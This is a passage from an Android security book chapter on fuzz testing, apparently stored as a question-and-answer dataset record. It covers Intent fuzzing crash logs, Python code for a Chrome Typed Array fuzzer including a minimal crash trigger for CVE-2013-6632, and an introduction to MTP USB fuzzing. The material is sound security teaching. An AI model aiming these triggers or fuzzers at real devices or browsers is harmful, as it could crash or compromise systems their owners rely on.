at\ncom.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)\nE/AndroidRuntime( 568): at\ndalvik.system.NativeStart.main(Native Method)\nE/AndroidRuntime( 568): Caused by: java.lang.NullPointerException\nE/AndroidRuntime( 568): at\ncom.yougetitback.androidapplication.SmsIntentReceiver.onReceive\n(SmsIntentReceiver.java:1150)\nE/AndroidRuntime( 568): at\nandroid.app.ActivityThread.handleReceiver(ActivityThread.java:2229)\nE/AndroidRuntime( 568): ... 10 more\nEven OEM- and Google-provided components can fall prey to this approach,\noften with interesting results. On a Nexus S, we applied our approach to the\nPhoneApp$NotificationBroadcastReceiver receiver, which is a component of\nthe com.android.phone package. The output from logcat at the time is presented\nin the following code:\nD/PhoneApp( 5605): Broadcast from Notification: null\n...\nE/AndroidRuntime( 5605): java.lang.RuntimeException: Unable to start\nreceiver com.android.phone.PhoneApp$NotificationBroadcastReceiver:\njava.lang.NullPointerException\nE/AndroidRuntime( 5605): at\nandroid.app.ActivityThread.handleReceiver(ActivityThread.java:2236)\n...\nW/ActivityManager( 249): Process com.android.phone has crashed too many\ntimes: killing!\nI/Process ( 5605): Sending signal. PID: 5605 SIG: 9\nI/ServiceManager( 81): service 'simphonebook' died\nI/ServiceManager( 81): service 'iphonesubinfo' died\nI/ServiceManager( 81): service 'isms' died\nc06.indd 01:19:0:PM 02/24/2014 Page 186\nChapter 6 ■ Finding Vulnerabilities with Fuzz Testing 187\nI/ServiceManager( 81): service 'sip' died\nI/ServiceManager( 81): service 'phone' died\nI/ActivityManager( 249): Process com.android.phone (pid 5605) has died.\nW/ActivityManager( 249): Scheduling restart of crashed service\ncom.android.phone/.TelephonyDebugService in 1250ms\nW/ActivityManager( 249): Scheduling restart of crashed service\ncom.android.phone/.BluetoothHeadsetService in 11249ms\nV/PhoneStatusBar( 327): setLightsOn(true)\nI/ActivityManager( 249): Start proc com.android.phone for restart\ncom.android.phone: pid=5638 uid=1001 gids={3002, 3001, 3003, 1015, 1028}\n...\nHere you see the receiver raising a NullPointerException. In this case, how-\never, when the main thread dies, the ActivityManager sends the SIGKILL signal\nto com.android.phone. The result is the death of services like sip, phone, isms,\nassociated Content Providers that handle things like SMS messages, and more.\nAccompanying this, the familiar Force Close modal dialog appears on the device\nas shown in Figure 6-1.\nFigure 6-1: Force Close dialog from com.android.phone\nThough not particularly glamorous, a quick null Intent fuzzing run effectively\ndiscovered a fairly simple way to crash the phone application. At fi rst glance, this\nseems to be nothing more than a casual annoyance to the user—but it doesn’t\nend there. Shortly after, rild receives a SIGFPE signal. This typically indicates\nan erroneous arithmetic operation, often a divide-by-zero. This actually results\nin a crash dump, which is written to the log and to a tombstone fi le. The follow-\ning code shows some relevant details from the crash log.\n*** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***\nBuild fingerprint:\n'google/soju/crespo:4.1.2/JZO54K/485486:user/release-keys'\npid: 5470, tid: 5476, name: rild >>> /system/bin/rild <<<\nsignal 8 (SIGFPE), code -6 (?), fault addr 0000155e\nr0 00000000 r1 00000008 r2 00000001 r3 0000000a\nr4 402714d4 r5 420973f8 r6 0002e1c6 r7 00000025\nr8 00000000 r9 00000000 sl 00000002 fp 00000000\nip fffd405c sp 40773cb0 lr 40108ac0 pc 40106cc8 cpsr 20000010\n...\nbacktrace:\nc06.indd 01:19:0:PM 02/24/2014 Page 187\n188 Chapter 6 ■ Finding Vulnerabilities with Fuzz Testing\n#00 pc 0000dcc8 /system/lib/libc.so (kill+12)\n#01 pc 0000fabc /system/lib/libc.so (__aeabi_ldiv0+8)\n#02 pc 0000fabc /system/lib/libc.so (__aeabi_ldiv0+8)\n...\nBy looking at the back trace from this crash report, you can see the fault had\nsomething to do with the ldiv0 function in libc.so, which apparently calls\nthe kill function. The relationship between rild and the com.android.phone\napplication may be apparent to those more familiar with Android—and is dis-\ncussed in greater detail in Chapter 11. Our simple fuzzing run reveals that this\nparticular Broadcast Receiver has some effect on an otherwise fundamentally\ncore component of Android. Although null Intent fuzzing may not lead to the\ndiscovery of many exploitable bugs, it’s a good go-to for fi nding endpoints with\nweak input validation. Such endpoints are great targets for further exploration.\nFuzzing Chrome for Android\nThe Android Browser is an attractive fuzz target for many reasons. First, it is a\nstandard component that is present on all Android devices. Also, the Android\nbrowser is composed of Java, JNI, C++, and C. Because web browsers focus heav-\nily on performance, a majority of the code is implemented in native languages.\nPerhaps due to its complexity, many vulnerabilities have been found in browser\nengines. This is especially true for the WebKit engine that the Android browser\nis built on. It’s easy to get started fuzzing the browser since very few external\ndependencies exist; only a working Android Debug Bridge (ADB) environ-\nment is needed to get started. Android makes it easy to automate processing\ninputs. Most important, as discussed in Chapter 5, the web browser exposes an\nabsolutely astonishing amount of attack surface through all of the technologies\nthat it supports.\nThis section presents a rudimentary fuzzer called BrowserFuzz. This fuzzer\ntargets the main rendering engine within the Chrome for Android browser,\nwhich is one of the underlying dependency libraries. As is typical with any\nfuzzing, the goal is to exercise Chrome’s code with many malformed inputs.\nNext this section explains how we selected which technology to fuzz, generated\ninputs, delivered them for processing, and monitored the system for crashes.\nCode excerpts from the fuzzer support the discussion. The complete code is\nincluded with the materials on the book’s website.\nSelecting a Technology to Target\nWith a target as large and complex as a web browser, it’s challenging to decide\nexactly what to fuzz. The huge number of supported technologies makes it\nc06.indd 01:19:0:PM 02/24/2014 Page 188\nChapter 6 ■ Finding Vulnerabilities with Fuzz Testing 189\ninfeasible to develop a fuzzer that exercises all of the functionality. Even if you\ndeveloped such a fuzzer, it would be unlikely to obtain an acceptable level of\ncode coverage. Instead, it’s best to focus fuzzing efforts on a smaller area of\ncode. Exempli gratia, concentrate on fuzzing SVG or XSLT alone, or perhaps\nfocus on the interaction between two technologies like JavaScript and HTML.\nChoosing exactly where to focus fuzzing efforts is one of the most important\nparts of any browser fuzzing project. A good target is one that seemingly contains\nthe most features and is less likely to have already been audited by others. For\nexample, closed-source components can be diffi cult to audit and making them\nan easy target for fuzzing. Another thing to consider when choosing a browser\ntechnology is the amount of documentation. Less-documented functionality\nhas the probability of being poorly implemented; giving you a better chance\nof causing a crash.\nBefore selecting a technology, gather as much information as possible about\nwhat technologies are supported. Browser compatibility sites like http://\nmobilehtml5.org/ and http://caniuse.com/ contain a wealth of knowledge\nabout what technologies are supported by various browsers. Finally, the ulti-\nmate resource is the source code itself. If the source code is not available for the\ntarget technology, reverse engineering binaries enhances fuzzer development.\nIt’s also worthwhile to research the technology in depth or review past bugs or\nvulnerabilities discovered in the target code or similar code. In short, gathering\nmore information leads to more informed decisions.\nFor simplicity’s sake, we decided to focus on HTML version 5. This specifi ca-\ntion represents the fi fth incarnation of the core language of web browser tech-\nnology. At the time of this writing, it is still fairly young and has yet to become\na W3C recommendation. That said, HTML5 has become the richest and most\nencompassing version of HTML to date. It includes direct support for tags like\n<video> and <audio>. Further, it supports <canvas>, which is a scriptable graph-\nics context that allows drawing and rendering graphics programmatically. The\nrichness of HTML5 comes from its heavy reliance on scripting, which makes\nextremely dynamic content possible.\nThis text focuses on an HTML version 5 feature that was added relatively\nrecently within the Chrome for Android browser: Typed Arrays. This feature\nallows a web developer access to a region of memory that is formatted as a\nnative array. Consider the following code excerpt:\nvar arr = new Uint8Array(16);\nfor (var n = 0; n < arr.length; n++) {\narr[n] = n;\n}\nThis code creates an array of sixteen elements and initializes it to contain\nthe numbers 0 through 15. Behind the scenes, the browser stores this data the\nc06.indd 01:19:0:PM 02/24/2014 Page 189\n190 Chapter 6 ■ Finding Vulnerabilities with Fuzz Testing\nsame way a native array of unsigned characters would be stored. The following\nexcerpt shows the native representation:\n00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f\nAs shown in the preceding code, the data is packed very tightly together. This\nfact makes it very effi cient and convenient for passing to underlying code that\noperates on arrays in native representation. A great example is image libraries.\nBy not having to translate data back and forth between JavaScript and native\nrepresentations, the browser (and consequently the web application) can achieve\ngreater performance through improved effi ciency.\nAt the 2013 Mobile Pwn2Own competition, the researcher known as Pinkie\nPie demonstrated a successful compromise of the Chrome for Android browser\nrunning on fully updated Nexus 4 with Android 4.3. Shortly thereafter, fi xes for\nthe issues exploited by Pinkie Pie were committed to the affected open source\nrepositories. When taking a closer look, Jon Butler of MWR Labs spotted a\nchange in the Typed Arrays code implemented in the V8 JavaScript engine used\nby Chrome. After realizing the issue, he tweeted a minimal proof-of-concept\ntrigger for the vulnerability, as shown in Figure 6-2.\nFigure 6-2: Minimal trigger for CVE-2013-6632\nUpon seeing this proof-of-concept, we were inspired to develop a fuzzer that\nfurther exercised the Typed Arrays code within Chrome for Android. If such\nan egregious mistake was present, there may be further issues lurking within.\nWith a target selected, we were ready to develop the code needed to get started\nfuzz testing this functionality.\nGenerating Inputs\nThe next step in the process of creating this fuzzer is to develop code to pro-\ngrammatically generate test cases. Unlike mutation-based dumb fuzzing, we\ninstead use a generative approach. Starting from the minimal proof-of-concept\npublished by Jon Butler, we aim to develop a rudimentary page generator. Each\nc06.indd 01:19:0:PM 02/24/2014 Page 190\nChapter 6 ■ Finding Vulnerabilities with Fuzz Testing 191\npage contains some boilerplate code that executes a JavaScript function after it\nis loaded. Then, we randomly generate some JavaScript that exercises the Typed\nArray functionality within the JavaScript function itself. Thus, the core of our\ngenerative algorithm focuses on the body of the JavaScript function.\nFirst, we break the minimal trigger down into the creation of two separate\narrays. In the proof-of-concept, the fi rst array is a traditional JavaScript array\nthat is reserved for a particular size. By default, it gets fi lled with zero values.\nThe creation of this array is nested inside the minimal trigger, but can instead\nbe done separately. Using this form, the minimal trigger becomes\nvar arr1 = new Array(0x24924925);\nvar arr2 = new Float64Array(arr1);\nWe use this notation in our fuzzer, as it allows us to try other Typed Array\ntypes in place of the traditional JavaScript Array type.\nTo generate the code that creates the fi rst array, we used the following code:\n45 page += \" try { \" + generate_var() + \" } catch(e) { console.log(e);\n}\\n\"\nHere, we use the generate_var function to create the declaration of the fi rst\narray. We wrap the creation of the array in a try-catch block and print any error\nthat occurs to the browser’s console. This helps quickly discover potential issues in\nwhat we are generating. The following is the code for the generate_var function:\n64 def generate_var():\n65 vtype = random.choice(TYPEDARRAY_TYPES)\n66 vlen = rand_num()\n67 return \"var arr1 = new %s(%d);\" % (vtype, vlen)\nFirst we randomly choose a Typed Array type from our static array of sup-\nported types. Following that, we choose a random length for the array using\nthe rand_num function. Finally, we use the type and random length to create\nthe declaration of our fi rst array.\nNext, we turn our attention to generating the second array. This array is\ncreated from the fi rst array and uses its size. The vulnerability hinges on the\nfi rst array being within a particular range of sizes for two reasons. First and\nforemost, it leads to an integer overfl ow occurring when calculating the size\nof the memory region to be allocated for the second array. Second, it needs to\npass some validation that was meant to prevent the code from proceeding in\nthe case that an integer overfl ow had occurred. Unfortunately, the check was\nincorrectly performed in this case. Here is an excerpt with the code that gener-\nates the second array:\n49 page += \" try { \" + generate_assignment() +\n\" }catch(e){ console.log(e); }\\n\"\nc06.indd 01:19:0:PM 02/24/2014 Page 191\n192 Chapter 6 ■ Finding Vulnerabilities with Fuzz Testing\nSimilar to how we generate the creation of the fi rst array, we wrap the creation\nin a try-catch block. Instead of using the generate_var function, we use the\ngenerate_assignment function. The code for this function follows:\n69 def generate_assignment():\n70 vtype = random.choice(TYPEDARRAY_TYPES)\n71 return \"var arr2 = new %s(arr1);\" % (vtype)\nThis function is a bit simpler because we don’t need to generate a random\nlength. We simply choose a random Typed Array type and generate the JavaScript\nto declare the second array based on the fi rst.\nIn this fuzzer, the rand_num function is crucial. In the minimal trigger, a rather\nlarge number is used. In an attempt to generate values similar to that value, we\ndevised the algorithm shown here:\ndef rand_num():\ndivisor = random.randrange(0x8) + 1\ndividend = (0x100000000 / divisor)\nif random.randrange(3) == 0:\naddend = random.randrange(10)\naddend -= 5\ndividend += addend\nreturn dividend\nFirst we select a random divisor between 1 and 8. We don’t use zero as divid-\ning by 0 would crash our fuzzer. Further, we don’t use any numbers greater\nthan 8, because 8 is the largest size for an element in any of the Typed Array\ntypes (Float64Array). Next, we divide 232 by our randomly selected divisor. This\nyields a number that is likely to trigger an integer overfl ow when multiplied.\nFinally, we add a number between –5 and 4 to the result with a one-in-three\nprobability. This helps discover corner cases where an integer overfl ow occurs\nbut doesn’t cause ill behavior.\nFinally, we compile a list of the Typed Array types from the specifi cation. A\nlink to the specifi cation is provided in Appendix C included in this book. We\nput the types into the global Python array called TYPEDARRAY_TYPES that is used\nby the generate_var and generate_assignment functions. When combined\nwith the boilerplate code that executes our generated JavaScript function, we\nare able to generate functional inputs in the form of HTML5 pages that exercise\nTyped Arrays. Our input generation task is complete, and we are ready to get\nour Android devices processing them.\nProcessing Inputs\nNow that the browser fuzzer is generating interesting inputs, the next step is to\nget the browser processing them. Although this task is often the least sexy to\nc06.indd 01:19:0:PM 02/24/2014 Page 192\nChapter 6 ■ Finding Vulnerabilities with Fuzz Testing 193\nimplement, without it you cannot achieve the automation that makes fuzz testing\nso great. Browsers primarily take input based on Universal Resource Locators\n(URLs). Diving deep into all of the complexities involved in URL construction\nand parsing is out of the scope of this chapter. What’s most important is that the\nURL tells the browser what mechanism to use to obtain the input. Depending\non which mechanism is used, the input must be delivered accordingly.\nBrowserFuzz provides inputs to the browser using HTTP. It’s likely that other\nmeans, such as uploading the input and using a file:// URL, would work but\nthey were not investigated. To deliver inputs via HTTP, the fuzzer implements\na rudimentary HTTP server based on the Twisted Python framework. The\nrelevant code is shown here:\n13 from twisted.web import server, resource\n14 from twisted.internet import reactor\n...\n83 class FuzzServer(resource.Resource):\n84 isLeaf = True\n85 page = None\n86 def render_GET(self, request):\n87 path = request.postpath[0]\n88 if path == \"favicon.ico\":\n89 request.setResponseCode(404)\n90 return \"Not found\"\n91 self.page = generate_page()\n92 return self.page\n93\n94 if __name__ == \"__main__\":\n95 # Start the HTTP server\n96 server_thread = FuzzServer()\n97 reactor.listenTCP(LISTEN_PORT, server.Site(server_thread))\n98 threading.Thread(target=reactor.run, args=(False,)).start()\nAs stated previously, this HTTP server is quite rudimentary. It only responds\nto GET requests and has very little logic for what to return. Unless the favicon\n.ico fi le is requested, the server always returns a generated page, which it saves\nfor later. In the icon case, a 404 error is returned to tell the browser that no such\nfi le is available. In the main portion of the fuzzer, the HTTP server is started\nin its own background thread. Thanks to Twisted, nothing further needs to be\ndone to serve the generated inputs.\nWith an HTTP server up and running, the fuzzer still needs to do one more\nthing to get inputs processed automatically. It needs to instruct the browser to\nload pages from the corresponding URL. Automating this process on Android\nis very easy, thanks to ActivityManager. By simply sending an Intent using the\nam command-line program, you can simultaneously start the browser and tell\nit where to load content from. The following excerpt from the execute_test\nfunction inside BrowserFuzz does this.\nc06.indd 01:19:0:PM 02/24/2014 Page 193\n194 Chapter 6 ■ Finding Vulnerabilities with Fuzz Testing\n57 tmpuri = \"fuzzyou?id=%d\" % (time.time())\n58 output = subprocess.Popen([ 'adb', 'shell', 'am', 'start',\n59 '-a', 'android.intent.action.VIEW',\n60 '-d', 'http://%s:%d/%s' % (LISTEN_HOST, LISTEN_PORT,\ntmpuri),\n61 '-e', 'com.android.browser.application_id', 'wooo',\n62 'com.android.chrome'\n63 ], stdout=subprocess.PIPE,\nstderr=subprocess.STDOUT).communicate()[0]\nLine 57 generates a time-based query string to request. The time is used\nto ensure that the browser will request a fresh copy of the content each time\ninstead of reusing one from its cache. Lines 58 through 63 actually execute the\nam command on the device using ADB.\nThe full command line that BrowserFuzz uses is fairly lengthy and involved.\nIt uses the start subcommand, which starts an Activity. Several Intent options\nfollow the subcommand. First, the Intent action (android.intent.action.VIEW)\nis specifi ed with the -a switch. This particular action lets the ActivityManager\ndecide how to handle the request, which in turn decides based on the data\nspecifi ed with the -d switch. BrowserFuzz uses an HTTP URL that points back\nto the server that it started, which causes ActivityManager to launch the default\nbrowser. Next, the -e switch provides extra data to Chrome that sets com.android\n.browser.application_id to “wooo”. This has the effect of opening the request\nin the same browser tab instead of creating a new tab for each execution. This\nis particularly important because creating tons of new tabs wastes memory and\nmakes restarting a crashed browser more time consuming. Further, reopening\nprevious test cases on restart is unlikely to help fi nd a bug because such inputs\nwere already processed once. The fi nal part of the command specifi es the package\nthat should be started. Though this fuzzer uses com.android.chrome, target-\ning other browsers is also possible. For example, the old Android Browser on\na Galaxy Nexus can be launched by using the com.google.android.browser\npackage name instead.\nBecause BrowserFuzz aims to test many inputs automatically, the fi nal piece\nof the input processing puzzle is a trivial loop that repeatedly executes tests.\nHere is the code:\n45 def run(self):\n46 while self.keep_going:\n47 self.execute_test()\nAs long as the fl ag keep_going is true, BrowserFuzz will continually execute\ntests. With tests executing, the next step is to monitor the target application for\nill behavior.\nMonitoring Testing\nAs discussed earlier in this chapter, monitoring the behavior of the target pro-\ngram is essential to knowing whether you’ve discovered something noteworthy.\nc06.indd 01:19:0:PM 02/24/2014 Page 194\nChapter 6 ■ Finding Vulnerabilities with Fuzz Testing 195\nThough a variety of techniques for monitoring exist, BrowserFuzz uses a sim-\nplistic approach.\nRecall from Chapter 2 that Android contains a system logging mechanism\nthat is accessible using the logcat command. This program exists on all Android\ndevices and is exposed directly via ADB. Also recall that Android contains a\nspecial system process called debuggerd. When a process on Android crashes,\ndebuggerd writes information about the crash to the system log. BrowserFuzz\nrelies on these two facilities to achieve its monitoring.\nPrior to starting Chrome, the fuzzer clears the system log to remove any\nirrelevant entries. The following line does this:\n54 subprocess.Popen([ 'adb', 'logcat', '-c' ]).wait() # clear log\nAs before, we use the subprocess.Popen Python function to execute the adb\ncommand. This time we use the logcat command, passing the -c argument to\nclear the log.\nNext, after pointing the browser at its HTTP server, the fuzzer gives the\nbrowser some time to process the crafted input. To do this, it uses Python’s\ntime.sleep function:\n65 time.sleep(60) # give the device time hopefully crash)\nWe pass a number of seconds that gives Chrome enough time to process our\ncrafted input. The number here is quite large, but this is intentional. Processing\nlarge TypedArrays can take a decent amount of time, especially when running\non a relatively low-powered device.\nThe next step is to examine the system log to see what happened. Again, we\nuse the adb logcat command as shown here:\n68 log = subprocess.Popen([ 'adb', 'logcat', '-d' ], # dump\n69 stdout=subprocess.PIPE,\nstderr=subprocess.STDOUT).communicate()[0]\nThis time we pass the -d argument to tell logcat to dump the contents of the\nsystem log. We capture the output of the command into the log variable. To do\nthis, we use the stdout and stderr options of subprocess.Popen combined with\nthe communicate method of the returned object.\nFinally, we examine the log contents in our fuzzer using the following code.\n72 if log.find('SIGSEGV') != -1:\n73 crashfn = os.path.join('crashes', tmpuri)\n74 print \" Crash!! Saving page/log to %s\" % crashfn\n75 with open(crashfn, \"wb\") as f:\n76 f.write(self.server.page)\n77 with open(crashfn + '.log', \"wb\") as f:\n78 f.write(log)\nThe most interesting crashes, from a memory corruption point of view, are\nsegmentation violations. When these appear in the system logs, they contain the\nc06.indd 01:19:0:PM 02/24/2014 Page 195\n196 Chapter 6 ■ Finding Vulnerabilities with Fuzz Testing\nstring SIGSEGV. If we don’t fi nd the string in the system log output, we discard\nthe generated input and try again. If we do fi nd the string, we can be relatively\ncertain that a crash occurred due to our fuzz testing.\nAfter a crash is observed, we store the system log information and gener-\nated input fi le locally for later analysis. Having this information on the local\nmachine allows us to quickly examine crashes in another window while letting\nthe fuzzer continue to run.\nTo prove the effectiveness of this fuzzer, the authors ran the fuzzer for sev-\neral days. The specifi c test equipment was a 2012 Nexus 7 running Android\n4.4. The version of the Chrome for Android app available at the time of Mobile\nPwn2Own 2013 was used. This version was obtained by uninstalling updates\nto the app within Settings ➢ Apps and disabling updates within Google Play.\nThe following shows the specifi c version information:\nW/google-breakpad(12273): Chrome build fingerprint:\nW/google-breakpad(12273): 30.0.1599.105\nW/google-breakpad(12273): 1599105\nW/google-breakpad(12273): ca1917fb-f257-4e63-b7a0-c3c1bc24f1da\nWhile testing, monitoring the system log in another window provided addi-\ntional insight into the progress of the fuzzer. Specifi cally, it revealed that a few\nof the TypedArray types are not supported by Chrome, as evidenced by the\nfollowing output.\nI/chromium( 1690): [INFO:CONSOLE(10)] \"ReferenceError: ArrayBufferView\nis not defined\", source: http://10.0.10.10:31337/fuzzyou?id=1384731354 (10)\n[...]\nI/chromium( 1690): [INFO:CONSOLE(10)] \"ReferenceError: StringView is not\ndefined\", source: http://10.0.10.10:31337/fuzzyou?id=1384731406 (10)\nCommenting out those types improves the effectiveness of the fuzzer. Without\nmonitoring the system log, this would go unnoticed and test cycles would be\nneedlessly wasted.\nDuring testing, hundreds of crashes occurred. Most of the crashes were NULL\npointer dereferences. Many of these were due to out-of-memory conditions. The\noutput from one such crash follows.\nBuild fingerprint: 'google/nakasi/grouper:4.4/KRT16O/907817:user/release-\nkeys'\nRevision: '0'\npid: 28335, tid: 28349, name: ChildProcessMai >>>\ncom.android.chrome:sandboxed_process3 <<<\nsignal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 00000000\nr0 00000000 r1 00000000 r2 c0000000 r3 00000000\nr4 00000000 r5 00000000 r6 00000000 r7 00000000\nr8 6ad79f28 r9 37a08091 sl 684e45d4 fp 6ad79f1c\nip 00000000 sp 6ad79e98 lr 00000000 pc 4017036c cpsr 80040010\nc06.indd 01:19:0:PM 02/24/2014 Page 196\nChapter 6 ■ Finding Vulnerabilities with Fuzz Testing 197\nAdditionally, several crashes referencing 0xbbadbeef occurred. This value\nis associated with memory allocation failures and other issues within Chrome\nthat are fatal. The following is one such example:\npid: 11212, tid: 11230, name: ChildProcessMai >>>\ncom.android.chrome:sandboxed_process10 <<<\nsignal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr bbadbeef\nr0 6ad79694 r1 fffffffe r2 00000000 r3 bbadbeef\nr4 6c499e60 r5 6c47e250 r6 6ad79768 r7 6ad79758\nr8 6ad79734 r9 6ad79800 sl 6ad79b08 fp 6ad79744\nip 2bde4001 sp 6ad79718 lr 6bab2c1d pc 6bab2c20 cpsr 40040030\nFinally, a few times crashes similar to the following appeared:\npid: 29030, tid: 29044, name: ChildProcessMai >>>\ncom.android.chrome:sandboxed_process11 <<<\nsignal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 93623000\nr0 6d708091 r1 092493fe r2 6eb3053d r3 6ecfe008\nr4 24924927 r5 049249ff r6 6ac01f64 r7 6d708091\nr8 6d747a09 r9 93623000 sl 5a3bb014 fp 6ac01f84\nip 6d8080ac sp 6ac01f70 lr 3dd657e8 pc 3dd63db4 cpsr 600e0010\nThe input that caused this crash is remarkably similar to the proof-of-concept\ntrigger provided by Jon Butler.\nThis fuzzer serves as an example of just how quick and easy fuzz testing can\nbe. With only a couple hundred lines of Python, BrowserFuzz is able to give\nthe TypedArrays functionality in Chrome a workout. In addition to uncovering\nseveral less critical bugs, this fuzzer successfully rediscovered the critical bug\nPinkie Pie used to win Mobile Pwn2Own. This fuzzer serves as an example that\nfocusing fuzzing efforts on a narrow area of code can increase effi ciency and\nthus the chance to fi nd bugs. Further, BrowserFuzz provides a skeleton that can\nbe easily repurposed by a motivated reader to fuzz other browser functionality.\nFuzzing the USB Attack Surface\nChapter 5 discussed some of the many different functions that the Universal\nSerial Bus (USB) interface of an Android device can expose. Each function\nrepresents an attack surface in itself. Although accessing these functions does\nrequire physical access to a device, vulnerabilities in the underlying code can\nallow accessing the device in spite of existing security mechanisms such as a\nlocked screen or disabled or secured ADB interface. Potential impact includes\nreading data from the device, writing data to the device, gaining code execution,\nrewriting parts of the device’s fi rmware, and more. These facts combined make\nthe USB attack surface an interesting target for fuzz testing.\nc06.indd 01:19:0:PM 02/24/2014 Page 197"
  },
  {
    "input": "What is the process for generating and processing fuzzed inputs when targeting a USB function on an Android device?",
    "summary": "This chapter explains how to use fuzz testing to find vulnerabilities in Android USB devices, focusing on device mode services. It discusses the challenges of USB fuzzing, including kernel panics and bus resets, and how to handle them. The text also details the process of selecting a target USB mode, generating inputs using a public tool, and monitoring the device for errors.",
    "output": "198 Chapter 6 ■ Finding Vulnerabilities with Fuzz Testing\nThere are two primary categories of USB devices: hosts and devices. Although\nsome Android devices are capable of becoming a host, many are not. When a\ndevice switches to behaving as a host, usually by using an On-the-Go (OTG)\ncable, it’s said to be in host mode. Because host mode support on Android devices\nhas a checkered past, this section instead focuses on fuzzing device mode services.\nUSB Fuzzing Challenges\nFuzzing a USB device, like other types of fuzzing, presents its own set of chal-\nlenges. Some input processing is implemented in the kernel and some in user-\nspace. If processing in the kernel encounters a problem, the kernel may panic\nand cause the device to reboot or hang. The user-space application that imple-\nments a particular function may, and hopefully will, crash. USB devices often\nrespond to errors by issuing a bus reset. That is, the device will disconnect itself\nfrom the host and reset itself to a default confi guration. Unfortunately, resetting\nthe device disconnects all USB functions currently in use, including any ADB\nsessions being used for monitoring. Dealing with these possibilities requires\nadditional detection and handling in order to maintain autonomous testing.\nThankfully Android is fairly robust in most of these situations. Services often\nrestart automatically. Android devices use a watchdog that will restart the device\nin the case of a kernel panic or hang. Many times, simply waiting for the device\nto come back is suffi cient. If the device doesn’t return, issuing a bus reset for the\ndevice may resolve the situation. Still, in some rare and less-than-ideal cases,\nit may be necessary to physically reconnect or power cycle the device to clear\nan error. It is possible to automate these tasks, too, though it may require using\nspecial hardware such as a USB hub that supports software control or custom\npower supplies. These methods are outside the scope of this chapter.\nThough fuzzing a USB device comes with its own challenges, much of the\nhigh-level process remains the same. Fuzzing one function at a time yields bet-\nter results than attempting to fuzz all exposed USB functions simultaneously.\nAs with most applications that allow communication between two computers,\napplications that use USB as a transport implement their own protocols.\nSelecting a Target Mode\nDue to the many different possible modes that a USB interface can be in, choosing\njust one can be diffi cult. On the other hand, changing the mode of an Android\ndevice usually switches the exposed functions. That is, one mode exposes a\ncertain set of functions but another mode exposes a different set of functions.\nThis can easily be seen when plugging a device into USB. Upon doing so, a\nnotifi cation will typically appear stating the current mode and instructing the\nuser to click to change options. Exactly which functions are supported varies\nc06.indd 01:19:0:PM 02/24/2014 Page 198\nChapter 6 ■ Finding Vulnerabilities with Fuzz Testing 199\nfrom one device to the next. Figure 6-3 shows the notifi cation when plugging\nin a Nexus 4 with Android 4.4.\nFigure 6-3: USB connected notification\nAfter clicking on the notifi cation, the user is brought to the screen shown in\nFigure 6-4.\nFigure 6-4: USB mode selection\nFrom Figure 6-4, it appears that not very many modes are offered by default on\nthe Nexus 4. The truth of the matter is that some other functions are supported,\nsuch as USB tethering, but they must be explicitly enabled or set by booting up\nin special ways. This device is in its default setting, and thus “Media device\n(MTP)” is the default function exposed by the device in its factory state. This\nalone makes it the most attractive fuzz target.\nGenerating Inputs\nAfter selecting a specifi c USB function to target, the next step is to learn as\nmuch as possible about it. Thus far, the only thing known is that the Android\ndevice identifi es this function as “Media device (MTP).” Researching the MTP\nacronym reveals that it stands for Media Transfer Protocol. A brief investiga-\ntion explains that MTP is based on Picture Transfer Protocol (PTP). Further,\nsearching for “MTP fuzzing” leads to a publicly available tool that implements\nfuzzing MTP. Olle Segerdahl developed this tool and released it at the 2012 T2\nInfosec conference in Finland. The tool is available at https://github.com/\nollseg/usb-device-fuzzing.git. The rest of this section examines how this\nfuzzer generates and processes inputs.\nc06.indd 01:19:0:PM 02/24/2014 Page 199\n200 Chapter 6 ■ Finding Vulnerabilities with Fuzz Testing\nUpon taking a deeper look at Olle’s usb-device-fuzzing tool, it becomes obvi-\nous that he built his generation strategy on the popular Scapy packet manipula-\ntion tool. This is an excellent strategy because Scapy provides much of what is\nneeded to generate fuzzed packet input. It allows the developer to focus on the\nspecifi c protocol at hand. Still, Olle had to tell Scapy about the structure of MTP\npackets and the fl ow of the protocol. He also had to implement any nonstandard\nhandling such as relationships between data and length fi elds.\nThe code for generating packets lies within the USBFuzz/MTP.py fi le. Per\nusual, it starts by including the necessary Scapy components. Olle then defi ned\ntwo dictionaries to hold the Operation and Response codes used by MTP. Next,\nOlle defi ned a Container class and two of MTP’s Transaction Phases. All MTP\ntransactions are prefi xed by a container to let the MTP service know how to\ninterpret the following data. The Container class, which is actually described\nin the PTP specifi cation, is listed here:\n98 class Container(Packet):\n99 name = \"PTP/MTP Container \"\n100\n101 _Types = {\"Undefined\":0, \"Operation\":1, \"Data\":2, \"Response\":3,\n\"Event\":4}\n102\n103 _Codes = {}\n104 _Codes.update(OpCodes)\n105 _Codes.update(ResCodes)\n106 fields_desc = [ LEIntField(\"Length\", None),\n107 LEShortEnumField(\"Type\", 1, _Types),\n108 LEShortEnumField(\"Code\", None, _Codes),\n109 LEIntField(\"TransactionID\", None) ]\nThis object generates the container structure used by both PTP and MTP.\nBecause it’s built on Scapy, this class only needs to defi ne fi elds _desc. It tells\nScapy how to build the packet that represents the object. As seen from the\nsource code, the Container packet consists of only four fi elds: a length, a type,\na code, and a transaction identifi er. Following this defi nition the Container\nclass contains a post_build function. It handles two things. First, it copies the\ncode and transaction identifi er from the payload, which will contain one of\nthe two packet types discussed next. Finally, the post_build function updates\nthe Length fi eld based on the size of the provided payload.\nThe next two objects that Olle defi ned are the Operation and Response pack-\nets. These packets are used as the payload for Container objects. They share a\ncommon structure and differ only by the codes that are valid in the Code fi eld.\nThe following excerpt shows the relevant code:\n127 class Operation(Packet):\n128 name = \"Operation \"\n129 fields_desc = [ LEShortEnumField(\"OpCode\", 0, OpCodes),\nc06.indd 01:19:0:PM 02/24/2014 Page 200\nChapter 6 ■ Finding Vulnerabilities with Fuzz Testing 201\n130 LEIntField(\"SessionID\", 0),\n[...]\n143 class Response(Packet):\n144 name = \"Response \"\n145 fields_desc = [ LEShortEnumField(\"ResCode\", 0, ResCodes),\n146 LEIntField(\"SessionID\", 0),\n147 LEIntField(\"TransactionID\", 1),\n148 LEIntField(\"Parameter1\", 0),\n149 LEIntField(\"Parameter2\", 0),\n150 LEIntField(\"Parameter3\", 0),\n151 LEIntField(\"Parameter4\", 0),\n152 LEIntField(\"Parameter5\", 0) ]\nThese two packets represent the two most important of the four MTP trans-\naction types. For Operation 